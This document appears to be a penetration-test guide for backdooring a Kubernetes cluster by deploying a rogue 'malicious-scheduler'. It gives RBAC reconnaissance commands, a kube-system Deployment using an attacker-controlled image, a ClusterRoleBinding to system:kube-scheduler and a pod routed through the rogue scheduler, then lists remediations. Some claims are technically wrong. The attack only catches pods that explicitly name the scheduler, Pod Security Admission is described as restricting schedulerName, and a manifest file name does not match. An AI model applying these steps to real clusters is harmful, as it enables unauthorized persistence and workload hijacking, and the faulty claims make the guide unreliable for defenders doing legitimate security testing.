
# Kubernetes Penetration Test: Custom Scheduler Backdoor Deployment

## 1. Overview Section

### Attack Vector Description

This vulnerability allows an attacker to deploy a custom scheduler that surreptitiously redirects specific pods to compromised or attacker-controlled nodes within the Kubernetes cluster. The attacker exploits misconfigured RBAC permissions or compromised credentials to deploy a rogue scheduler. This scheduler then observes newly created pods and, based on pre-defined rules (e.g., pod name, label, namespace), forces them to run on attacker-controlled nodes. This creates a backdoor, enabling the attacker to intercept sensitive data, modify pod behavior, or use the pods for further lateral movement within the cluster.

### Potential Impact and Consequences

*   **Data Exfiltration:** Sensitive data processed by pods scheduled on compromised nodes can be intercepted and exfiltrated.
*   **Code Modification:** Code running within the targeted pods can be modified to insert malicious logic.
*   **Denial of Service (DoS):** Critical application components can be directed to nodes that are resource-constrained or offline, causing a service disruption.
*   **Lateral Movement:** The compromised pods can be used as stepping stones to access other resources within the cluster and the underlying infrastructure.
*   **Privilege Escalation:** Compromised pods, depending on their assigned service accounts, can potentially escalate privileges within the cluster.

### Risk Level Assessment

**Critical:** This vulnerability allows for complete control over specific workloads within the cluster, potentially leading to severe data breaches, service disruption, and unauthorized access to sensitive resources.

### Technical Explanation

Kubernetes utilizes a scheduler to determine which node a pod should be placed on. By default, the `kube-scheduler` is used, but Kubernetes allows for the deployment of custom schedulers. If an attacker can deploy a custom scheduler without proper authorization controls or through compromised credentials, they can manipulate pod placement decisions. The attacker's custom scheduler watches for new pods, applies custom scheduling logic (e.g., based on pod labels or namespace), and then directs those pods to nodes they control.  This manipulation is possible because the scheduler API allows for specifying a different scheduler during pod creation. The vulnerability lies in the lack of adequate authorization to prevent unauthorized scheduler deployment and the lack of robust auditing to detect malicious scheduler behavior.

### Prerequisites and Conditions Needed

*   **Compromised Credentials:** The attacker needs valid Kubernetes credentials with permissions to deploy and manage scheduler components.  This often means `cluster-admin` or equivalent privileges in a vulnerable namespace or across the cluster.
*   **RBAC Misconfiguration:**  Insecure RBAC configuration allowing unauthorized service accounts to deploy scheduler components.
*   **Vulnerable Pod Definition:** Pods that lack specific schedulerName requirements, allowing the custom scheduler to take effect.
*   **Network Access:**  The attacker needs network access to the Kubernetes API server.
*   **Attacker-Controlled Node:** The attacker needs at least one node under their control within the cluster (or the ability to compromise an existing node).

## 2. Validation and Exploitation Steps Section

### Validation Phase: Identifying a Potential Vulnerability

1.  **Check for Existing Custom Schedulers:**

    ```bash
    kubectl get deployments -n kube-system | grep scheduler
    kubectl get pods -n kube-system | grep scheduler
    ```

    *   **Explanation:** This command checks for deployments and pods in the `kube-system` namespace that contain "scheduler" in their name. Custom schedulers are usually deployed in this namespace.
    *   **Why:** This helps identify if custom schedulers already exist, potentially deployed by a previous attacker or due to legitimate custom configurations.  If multiple schedulers exist, it raises suspicion.
    *   **Expected Output:**  Lists of deployments and pods related to schedulers. Look for names that are not `kube-scheduler` or that appear suspicious.
    *   **Contributes to Validation:** Indicates the presence of existing schedulers beyond the default, prompting further investigation.

2.  **Check RBAC Permissions for Scheduler Management (deployments, daemonsets, pods):**

    ```bash
    kubectl auth can-i create deployments.apps -n kube-system
    kubectl auth can-i create daemonsets.apps -n kube-system
    kubectl auth can-i create pods -n kube-system
    kubectl auth can-i create deployments.apps --as system:serviceaccount:default:default -n kube-system
    kubectl auth can-i create daemonsets.apps --as system:serviceaccount:default:default -n kube-system
    kubectl auth can-i create pods --as system:serviceaccount:default:default -n kube-system

    ```

    *   **Explanation:** This command checks if the current user and the default service account have permissions to create deployments, daemonsets, and pods in the `kube-system` namespace.
    *   **Why:**  It verifies if the current credentials (or the default service account) have excessive permissions, potentially allowing scheduler deployment.
    *   **Expected Output:** `yes` or `no` for each command, indicating whether the permission is granted.  `yes` for deployment creation in `kube-system` is a red flag.
    *   **Contributes to Validation:** Identifies overly permissive RBAC policies that could allow unauthorized deployment of a custom scheduler.

### Exploitation Phase: Deploying a Malicious Custom Scheduler

1.  **Create a Custom Scheduler Deployment Manifest (scheduler-deployment.yaml):**

    ```yaml
    apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: malicious-scheduler
      namespace: kube-system
      labels:
        app: malicious-scheduler
    spec:
      replicas: 1
      selector:
        matchLabels:
          app: malicious-scheduler
      template:
        metadata:
          labels:
            app: malicious-scheduler
        spec:
          serviceAccountName: malicious-scheduler-sa
          containers:
          - name: malicious-scheduler
            image: <attacker-controlled-image> # Replace with your malicious scheduler image
            args:
            - "--kubeconfig=/etc/kubernetes/kubeconfig"
            - "--scheduler-name=malicious-scheduler"
            volumeMounts:
            - name: kubeconfig
              mountPath: /etc/kubernetes
          volumes:
          - name: kubeconfig
            secret:
              secretName: kubeconfig
    ```

    *   **Explanation:** This YAML defines a deployment for the malicious scheduler.  Crucially, it specifies `--scheduler-name=malicious-scheduler`, which is the name that pods will use to target this scheduler.  The `image` field must point to a container image hosted by the attacker. The service account is specified. Kubeconfig is mounted as a volume to provide credentials to the scheduler.
    *   **Why:**  This is the core of the exploit - deploying a custom scheduler that will intercept pod scheduling requests.
    *   **Expected Output:** None. This file is used for the next command.
    *   **Contributes to Validation:** This is the exploitation step, defining the attack vector. **Note:**  The container image referenced here *must* contain the malicious scheduler code.  A minimal scheduler that logs pod scheduling requests is sufficient for demonstration.  A more sophisticated scheduler would redirect pods to attacker-controlled nodes.
    *   **Important:** The attacker-controlled image must be pushed to a registry that the Kubernetes cluster can access.  If the image is private, credentials for pulling the image must be provided.

2.  **Create a Service Account and RoleBinding for the Scheduler**

    ```yaml
    apiVersion: v1
    kind: ServiceAccount
    metadata:
      name: malicious-scheduler-sa
      namespace: kube-system
    ---
    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRoleBinding
    metadata:
      name: malicious-scheduler-binding
    subjects:
    - kind: ServiceAccount
      name: malicious-scheduler-sa
      namespace: kube-system
    roleRef:
      kind: ClusterRole
      name: system:kube-scheduler
      apiGroup: rbac.authorization.k8s.io
    ```

    *   **Explanation:** Creates a service account and binds the `system:kube-scheduler` cluster role to it, granting the service account necessary privileges to act as a scheduler.
    *   **Why:** Grants the service account the necessary permissions to function as a scheduler.  **This is extremely dangerous if not properly authorized and should only be done for a controlled penetration test.**
    *   **Expected Output:** Creation of the service account and cluster role binding.
    *   **Contributes to Validation:** Enables the malicious scheduler to function properly.

3.  **Apply the Deployment and Service Account/RoleBinding Manifests:**

    ```bash
    kubectl apply -f malicious-scheduler-sa.yaml
    kubectl apply -f scheduler-deployment.yaml
    ```

    *   **Explanation:** This command deploys the custom scheduler based on the YAML manifest created in the previous step.
    *   **Why:**  This action actually deploys the malicious scheduler into the cluster.
    *   **Expected Output:** "deployment.apps/malicious-scheduler created", "serviceaccount/malicious-scheduler-sa created", "clusterrolebinding.rbac.authorization.k8s.io/malicious-scheduler-binding created".
    *   **Contributes to Validation:** This successfully deploys the backdoor scheduler.

4.  **Verify the Malicious Scheduler is Running:**

    ```bash
    kubectl get pods -n kube-system | grep malicious-scheduler
    kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep malicious-scheduler | awk '{print $1}')
    ```

    *   **Explanation:**  This command first lists pods in the `kube-system` namespace, filtering for the malicious scheduler.  Then, it retrieves the logs of the malicious scheduler pod.
    *   **Why:** To confirm that the scheduler is running and to check its logs for activity.
    *   **Expected Output:** The first command will list the malicious scheduler pod. The second command will output logs. The logs should show the scheduler starting up.
    *   **Contributes to Validation:** Confirms that the scheduler is successfully deployed and running.

5.  **Create a Pod that Targets the Malicious Scheduler (target-pod.yaml):**

    ```yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: target-pod
      labels:
        app: target-app
    spec:
      schedulerName: malicious-scheduler
      containers:
      - name: target-container
        image: nginx:latest
    ```

    *   **Explanation:** This YAML defines a simple pod that *explicitly* specifies the `schedulerName` as "malicious-scheduler". This is the key to redirecting the pod to the attacker's scheduler.
    *   **Why:** This ensures that the pod will be scheduled by the malicious scheduler, rather than the default scheduler.
    *   **Expected Output:** None. This file is used for the next command.
    *   **Contributes to Validation:** Directs a pod to the attacker-controlled scheduler.

6.  **Apply the Target Pod Manifest:**

    ```bash
    kubectl apply -f target-pod.yaml
    ```

    *   **Explanation:** Deploys the pod defined in `target-pod.yaml`.
    *   **Why:** Triggers the scheduling process, causing the malicious scheduler to handle the pod placement.
    *   **Expected Output:** "pod/target-pod created"
    *   **Contributes to Validation:** Starts the attack.

7.  **Observe the Malicious Scheduler Logs:**

    ```bash
    kubectl logs -n kube-system $(kubectl get pods -n kube-system | grep malicious-scheduler | awk '{print $1}')
    ```

    *   **Explanation:**  Retrieves the logs of the malicious scheduler pod again.
    *   **Why:** To verify that the scheduler received the scheduling request for the target pod.  The logs should now show information about the `target-pod`.
    *   **Expected Output:** The logs should contain information about the `target-pod` being scheduled, including its name, namespace, and resource requests.
    *   **Contributes to Validation:** Confirms that the malicious scheduler is actively intercepting pod scheduling requests.

8.  **Verify the Pod is Running (Potentially on a Compromised Node - Manual Inspection):**

    ```bash
    kubectl get pod target-pod -o wide
    ```

    *   **Explanation:** This command retrieves information about the `target-pod`, including the node it is running on.
    *   **Why:** To determine if the pod was successfully scheduled and to identify the node it was placed on.
    *   **Expected Output:**  The output will show the pod's name, status, and the node it is running on.  *Crucially, you must manually verify if this node is the attacker-controlled node.*
    *   **Contributes to Validation:** Confirms the final step of the attack - the pod is running and has been placed, by the rogue scheduler, on the intended node.

### Remediation Recommendations

*   **Principle of Least Privilege:** Implement strict RBAC policies, granting users and service accounts only the minimum necessary permissions.  Avoid using `cluster-admin` or equivalent privileges unless absolutely necessary.  Restrict the ability to create deployments, daemonsets, and pods in the `kube-system` namespace.
*   **Pod Security Policies (PSPs) / Pod Security Admission (PSA):**  Enforce security policies that restrict the `schedulerName` field in pod specifications, preventing users from specifying arbitrary schedulers. Ideally, only allow a pre-defined set of trusted schedulers. Consider PSA in "Restricted" mode.
*   **Auditing and Monitoring:** Implement robust auditing and monitoring of Kubernetes API server activity.  Specifically monitor for:
    *   Creation and modification of scheduler deployments.
    *   Unauthorized attempts to create pods with custom `schedulerName` values.
    *   Unexpected changes to RBAC policies.
*   **Image Scanning:** Scan container images for vulnerabilities and malicious code before deploying them to the cluster.
*   **Regular Security Assessments:** Conduct regular penetration tests and security audits to identify and address vulnerabilities in your Kubernetes environment.
*   **Network Policies:** Implement network policies to restrict communication between pods, limiting the potential impact of a compromised pod.
*   **Secure the Kubelet:**  Harden the kubelet configuration, restricting access and limiting its capabilities.

This documentation provides a clear and detailed outline for identifying and exploiting a custom scheduler backdoor vulnerability in Kubernetes. Remember to perform these tests in a controlled environment.
